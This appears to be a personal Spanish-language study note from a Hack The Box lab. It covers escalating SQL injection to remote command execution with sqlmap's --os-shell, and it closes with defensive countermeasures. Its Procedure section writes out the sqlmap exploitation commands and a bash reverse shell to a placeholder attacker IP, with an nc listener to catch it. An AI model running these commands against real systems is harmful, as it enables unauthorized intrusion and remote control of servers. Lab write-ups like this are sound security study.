---
tags:
  - tecnica
  - categoria/initial-access
  - categoria/execution
  - os/linux
  - nivel/medio
fecha_aprendida: 2026-09-09
fuente: HTB/Vaccine
mitre_technique: T1190
---
# ⚔️ SQL Injection → RCE con sqlmap --os-shell

> [!abstract] Resumen
> Escalada de una inyección SQL confirmada a ejecución de comandos en el servidor, automatizada con sqlmap. Distinto de un bypass de login ([[Técnicas/3_Explotación/SQL-Injection]]): acá la inyección ya está post-autenticación y el objetivo es RCE, no saltarse credenciales.

---

## ¿Qué es y por qué funciona?

Una vez que sqlmap confirma que un parámetro es inyectable, `--os-shell` intenta escalar de "leer datos" a "ejecutar comandos del sistema operativo" abusando de funciones propias del motor de base de datos. No es un exploit de una vulnerabilidad — es abuso de funcionalidad legítima del DBMS que, combinada con privilegios excesivos de la cuenta de conexión, permite escribir y ejecutar archivos en el servidor.

El mecanismo exacto depende del motor:
- **PostgreSQL:** usa `COPY ... FROM PROGRAM` (disponible desde PG 9.3) — requiere que el usuario conectado sea **superusuario** de Postgres.
- **MySQL:** usa `SELECT ... INTO OUTFILE` para escribir un webshell — requiere privilegio `FILE` y conocer (o poder inferir) el path del webroot.
- **MSSQL:** usa `xp_cmdshell` — requiere que ese procedimiento esté habilitado (deshabilitado por defecto desde SQL Server 2005+, pero re-habilitable si el atacante tiene privilegios suficientes).

En los tres casos, el fallo real no es "la inyección" — es que la cuenta de base de datos que usa la aplicación tiene privilegios muy por encima de lo que una app web necesita (nunca debería ser superusuario/FILE/sysadmin).

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - Inyección SQL confirmada en un parámetro (GET/POST) accesible con sqlmap
> - La cuenta de DB usada por la aplicación tiene privilegios elevados (superusuario en Postgres, FILE en MySQL, sysadmin/xp_cmdshell en MSSQL)
> - Si la app requiere sesión autenticada para llegar al parámetro vulnerable, se necesita la cookie de sesión válida

---

## Procedimiento

### Detección / Enumeración

```bash
# Confirmar la inyección primero, sin escalar todavía
sqlmap -u 'http://<IP>/ruta.php?param=valor' --cookie="PHPSESSID=<valor>" --batch
```

### Explotación

```bash
# Escalar a shell de sistema operativo
sqlmap -u 'http://<IP>/ruta.php?param=valor' --cookie="PHPSESSID=<valor>" --os-shell

# sqlmap pregunta el lenguaje del webserver si no lo detecta solo (relevante en MySQL/MSSQL,
# donde escribe un webshell; en PostgreSQL con COPY FROM PROGRAM no hace falta)

# Dentro del prompt os-shell>, cualquier comando corre en el servidor:
os-shell> whoami
os-shell> bash -c "bash -i >& /dev/tcp/<IP_atacante>/<puerto> 0>&1"
```

> [!tip] Variaciones comunes
> - Si `--os-shell` falla pero la inyección está confirmada: revisar privilegios de la cuenta DB antes de descartar la técnica — casi siempre es un tema de privilegios, no de que sqlmap no encontró el punto de inyección
> - El comando dentro de `os-shell>` que abre una reverse shell hace colgar la petición HTTP (el proceso queda corriendo) — sqlmap tira `connection timed out`, es el comportamiento esperado, no un fallo
> - `--sql-shell` es la alternativa si solo se necesita ejecutar SQL arbitrario (sin llegar a RCE)

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| sqlmap | Detección y explotación automatizada de SQLi, incluyendo RCE | `sqlmap -u <url> --cookie=<cookie> --os-shell` |
| nc | Recibir la reverse shell disparada desde `os-shell>` | `nc -lvnp <puerto>` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> Queries parametrizadas (elimina la inyección en origen — ver [[Técnicas/3_Explotación/SQL-Injection]]). Independientemente de eso: principio de mínimo privilegio en la cuenta de conexión de la aplicación — nunca superusuario/FILE/sysadmin para una cuenta que solo necesita SELECT/INSERT sobre tablas específicas. Egress filtering en el servidor de base de datos y en el servidor web, para que ninguno de los dos pueda iniciar conexiones salientes arbitrarias aunque se logre RCE.

---

## Dónde la usé

- [[HTB/Vaccine/Vaccine]] — parámetro `search` en `dashboard.php`, DBMS PostgreSQL, usuario de conexión era superusuario (confirmado por sqlmap: `testing if current user is DBA` → `retrieved: '1'`), lo que habilitó `COPY ... FROM PROGRAM` y por tanto `--os-shell`.

---

## Referencias

- [sqlmap - Wiki oficial, --os-shell](https://github.com/sqlmapproject/sqlmap/wiki)
- [PostgreSQL - COPY](https://www.postgresql.org/docs/current/sql-copy.html)
- [MITRE ATT&CK - T1190](https://attack.mitre.org/techniques/T1190/)
